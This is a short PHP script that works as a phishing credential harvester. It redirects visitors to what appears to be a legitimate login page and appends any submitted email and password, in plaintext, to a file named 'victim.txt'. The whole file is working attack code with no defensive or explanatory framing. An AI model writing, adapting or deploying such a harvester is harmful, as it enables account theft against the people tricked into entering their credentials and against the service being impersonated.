<?php
header("location: https://osissip.osis.online/auth/login");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    $log_entry = "Email: $email, Password: $password\n";
    file_put_contents("victim.txt", $log_entry, FILE_APPEND);
    
    
}
?>
